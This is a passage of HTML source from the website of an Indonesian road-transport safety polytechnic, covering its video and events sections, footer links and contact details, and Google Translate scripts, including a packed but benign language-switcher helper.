                                    <a class="btn btn-more" tabindex="0" href="https://pktj.ac.id/video/41-in-memoriam-ibu-tri-susila-hidayati-spd-msi-atau-bunda-sadar-lalu-lintas-usia-dini-salud" title="In Memoriam Ibu Tri Susila Hidayati, S.Pd , M.Si atau Bunda Sadar Lalu Lintas Usia Dini (SALUD)">Lihat Selengkapnya</a>
                                </div>
                            </div>
                        </article>
                    </div>
                                    </div>
                <div class="text-center btn-box no-border">
                    <a href="https://pktj.ac.id/video/52-seandainya-vierra-cover-by-mahasiswai-pktj" class="btn btn-more">Video Selengkapnya</a>
                </div>
            </div>
        </section>
        
        <section class="section-page schome-event">
            <div class="container">
                <div class="section-title">
                    <h3>Agenda Terbaru</h3>
                </div>
                <div class="event-slider row">
                    
                </div>
                <div class="text-center btn-box no-border">
                    <a href="https://pktj.ac.id/agenda" class="btn btn-more">LIHAT SEMUA EVENT</a>
                </div>
            </div>
        </section>

    </div>
</div>

    <footer id="footer">
        <div class="footer-body">
            <div class="container">
                <div class="row">
                    <div class="col-md-3 col-sm-5 footer-brand-wrapper">
                        <a href="https://pktj.ac.id/" class="footer-brand">
                            <img src="https://pktj.ac.id/assets/frontoffice/images/pktj_footer.png" alt="Politeknik Keselamatan Transportasi Jalan" loading="lazy">
                        </a>
                        <address>
                             <strong>Politeknik Keselamatan Transportasi Jalan</strong><br><i class="fa fa-building-o"></i>&nbsp;&nbsp;Jl. Abdul Syukur No.17, Kota Tegal<br>Jl. Semeru No.3, Kota Tegal<br><i class="fa fa-envelope"></i>&nbsp;&nbsp;<a href="mailto:pktj@pktj.ac.id">pktj@pktj.ac.id</a><br><i class="fa fa-phone"></i>&nbsp;&nbsp;Phone: (0283) 351061<br>Fax: (0283) 358965<br>                        </address>
                    </div>
                    <div class="col-md-9 col-sm-7 footer-menu-wrapper">
                        <div class="row">
                            <div><div class="col-md-3 col-sm-6 widget"><div class="widget-header"><h3 class="widget-title">Kerjasama</h3></div><div class="menu-footer"><ul id="menu-footer-pages" class="menu"><li><a href="https://pktj.ac.id/kategori/alumni" title="Alumni">Alumni</a></li><li><a href="https://docs.google.com/forms/d/e/1FAIpQLScRWpYDuK_VkG53vczGva7bMc7dDyLxTXCBmuKO5mZA55zCPA/viewform" title="Link Pendaftaran Diklat">Link Pendaftaran Diklat</a></li><li><a href="https://drive.google.com/file/d/1gxM-ziK9YnOPeTDQ_shomozDBvI9VGnl/view?usp=sharing" title="Tarif Layanan Diklat">Tarif Layanan Diklat</a></li><li><a href="https://drive.google.com/drive/folders/19w5j63NNqFI1TY-LRbR5YMGeRklmMgKc" title="Layanan Diklat PKTJ">Layanan Diklat PKTJ</a></li></ul></div></div><div class="col-md-3 col-sm-6 widget"><div class="widget-header"><h3 class="widget-title">Tentang PKTJ</h3></div><div class="menu-footer"><ul id="menu-footer-pages" class="menu"><li><a href="https://pktj.ac.id/tentang/9-sambutan-rektor" title="Sambutan Direktur">Sambutan Direktur</a></li><li><a href="https://pktj.ac.id/tentang/13-sejarah" title="Sejarah">Sejarah</a></li><li><a href="https://pktj.ac.id/tentang/14-visi-dan-misi" title="Visi dan Misi">Visi dan Misi</a></li><li><a href="https://pktj.ac.id/tentang/19-pimpinan-universitas" title="Pimpinan Politeknik">Pimpinan Politeknik</a></li><li><a href="https://pktj.ac.id/tentang/40-ppdi-pktj-tegal" title="PPID PKTJ Tegal">PPID PKTJ Tegal</a></li></ul></div></div><div class="col-md-3 col-sm-6 widget"><div class="widget-header"><h3 class="widget-title">Mengunjungi PKTJ</h3></div><div class="menu-footer"><ul id="menu-footer-pages" class="menu"><li><a href="https://pktj.ac.id/tentang/11-peta-kampus" title="Peta Kampus">Peta Kampus</a></li><li><a href="https://pktj.ac.id/agenda" title="Agenda">Agenda</a></li><li><a href="https://pktj.ac.id/berita" title="Berita">Berita</a></li><li><a href="https://pktj.ac.id/pages/brosur-pktj" title="Brosur PKTJ">Brosur PKTJ</a></li><li><a href="https://pktj.ac.id/galeri/13-fasilitas-alat-praktek-pktj" title="Galeri Photo">Galeri Photo</a></li></ul></div></div><div class="col-md-3 col-sm-6 widget"><div class="widget-header"><h3 class="widget-title">Link Terkait</h3></div><div class="menu-footer"><ul id="menu-footer-pages" class="menu"><li><a href="http://elearning.pktj.ac.id/" title="E-Learning PKTJ">E-Learning PKTJ</a></li><li><a href="http://online.sim.pktj.ac.id/" title="SIAKAD PKTJ">SIAKAD PKTJ</a></li><li><a href="http://library.pktj.ac.id/" title="Perpustakaan Online">Perpustakaan Online</a></li><li><a href="http://ktj.pktj.ac.id/index.php/ktj" title="E-Journal PKTJ">E-Journal PKTJ</a></li><li><a href="https://bit.ly/sipencatarpktjmandiri" title="Pendaftaran Sipencatar Mandiri">Pendaftaran Sipencatar Mandiri</a></li><li><a href="http://akademik.pktj.ac.id/" title="Administrasi Akademik">Administrasi Akademik</a></li><li><a href="https://meet.google.com/" title="Rapat Online PKTJ">Rapat Online PKTJ</a></li><li><a href="http://sister.pktj.ac.id/auth/login" title="SISTER PKTJ">SISTER PKTJ</a></li><li><a href="https://lab.pktj.ac.id/public/" title="Aplikasi Peminjaman LAB">Aplikasi Peminjaman LAB</a></li><li><a href="https://bengkel.pktj.ac.id/" title="Aplikasi Booking Bengkel PKTJ">Aplikasi Booking Bengkel PKTJ</a></li></ul></div></div></div>                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="footer-copyright">
            <div class="container">
                <div class="row">
                    <div class="col-md-6 col-sm-6">
                        <p class="copyright">&copy; 2025 Politeknik Keselamatan Transportasi Jalan</p>
                    </div>
                    <div class="col-md-6 col-sm-6">
                        <p class="site-menu text-right">
                            <a href="https://pktj.ac.id/kontak" title="Kontak">Kontak</a><a href="https://www.facebook.com/PKTJTegal/" title="facebook">facebook</a><a href="https://www.instagram.com/pktj_tegal/" title="Instagram">Instagram</a><a href="https://twitter.com/PKTJ_Tegal" title="Twitter">Twitter</a><a href="https://www.youtube.com/channel/UC9BbdnU-cczfaZ5FHulYPZA" title="Youtube">Youtube</a><a href="https://pktj.ac.id/program-studi/51-privacy-policy-e-learning" title="Privacy Policy ">Privacy Policy </a>                        </p>
                    </div>
                </div>
            </div>
        </div>
    </footer>

<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
<script type="text/javascript" defer src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js"></script>
<script type="text/javascript" defer src="https://pktj.ac.id/assets/frontoffice/js/slick.min.js"></script>
<script type="text/javascript" defer src="https://pktj.ac.id/assets/frontoffice/js/jquery.pin.min.js"></script>
<script type="text/javascript" defer src="https://pktj.ac.id/assets/frontoffice/js/jquery.nav.js"></script>
<script type="text/javascript" defer src="https://pktj.ac.id/assets/frontoffice/js/jquery.matchHeight-min.js"></script>
<script type="text/javascript" defer src="https://pktj.ac.id/assets/frontoffice/js/apps.min.js"></script>

<!-- Asynchronous CSS & Font -->
<noscript id="deferred-styles">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,400i,700|Montserrat:400,700|Open+Sans:400,400i,700,700i">
    <link rel="stylesheet" type="text/css" href="https://pktj.ac.id/assets/frontoffice/css/style.min.css">
</noscript>

<div id="google_translate_element2"></div>
<script type="text/javascript">
    function googleTranslateElementInit2() {new google.translate.TranslateElement({pageLanguage: 'id',autoDisplay: false}, 'google_translate_element2');}
</script>
<script type="text/javascript" src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit2"></script>

<style type="text/css">
    .goog-te-gadget-icon {
        display:none;
    }
    .goog-te-gadget-simple a {
        text-decoration: none !important;
    }
    .goog-te-banner-frame.skiptranslate {
        display: none !important;
    }

    #goog-gt-tt{
        display: none !important;
    }
    #google_translate_element, #google_translate_element2{
        display: none;
    }
    .skiptranslate{
        display: none;
    }
    body{
        top: 0px !important;
    }
</style>    

<script type="text/javascript">  
    // CSS async
    var loadDeferredStyles = function() {
        var addStylesNode = document.getElementById("deferred-styles");
        var replacement = document.createElement("div");
        replacement.innerHTML = addStylesNode.textContent;
        document.head.appendChild(replacement)
        addStylesNode.parentElement.removeChild(addStylesNode);
    };
    var raf = window.requestAnimationFrame || window.mozRequestAnimationFrame ||
    window.webkitRequestAnimationFrame || window.msRequestAnimationFrame;
    if (raf) raf(function() { window.setTimeout(loadDeferredStyles, 0); });
    else window.addEventListener('load', loadDeferredStyles);

     

    	
		/* <![CDATA[ */
    eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('6 7(a,b){n{4(2.9){3 c=2.9("o");c.p(b,f,f);a.q(c)}g{3 c=2.r();a.s(\'t\'+b,c)}}u(e){}}6 h(a){4(a.8)a=a.8;4(a==\'\')v;3 b=a.w(\'|\')[1];3 c;3 d=2.x(\'y\');z(3 i=0;i<d.5;i++)4(d[i].A==\'B-C-D\')c=d[i];4(2.j(\'k\')==E||2.j(\'k\').l.5==0||c.5==0||c.l.5==0){F(6(){h(a)},G)}g{c.8=b;7(c,\'m\');7(c,\'m\')}}',43,43,'||document|var|if|length|function|GTranslateFireEvent|value|createEvent||||||true|else|doGTranslate||getElementById|google_translate_element2|innerHTML|change|try|HTMLEvents|initEvent|dispatchEvent|createEventObject|fireEvent|on|catch|return|split|getElementsByTagName|select|for|className|goog|te|combo|null|setTimeout|500'.split('|'),0,{}))
    /* ]]> */
    
    function set_lang_data(){
       var lang_data = '';
        if(lang_data !='/id/en'){
            $('#label_indonesia').show();$('#label_english').hide();$('#dropdown_english').show();$('#dropdown_indonesia').hide();
        } else {
            $('#label_indonesia').hide();$('#label_english').show();$('#dropdown_english').hide();$('#dropdown_indonesia').show();
        }
        $('#dropdown-lang-parent').show();
    }
    
    setTimeout(set_lang_data(), 1000);
    
</script>
</body>
</html>
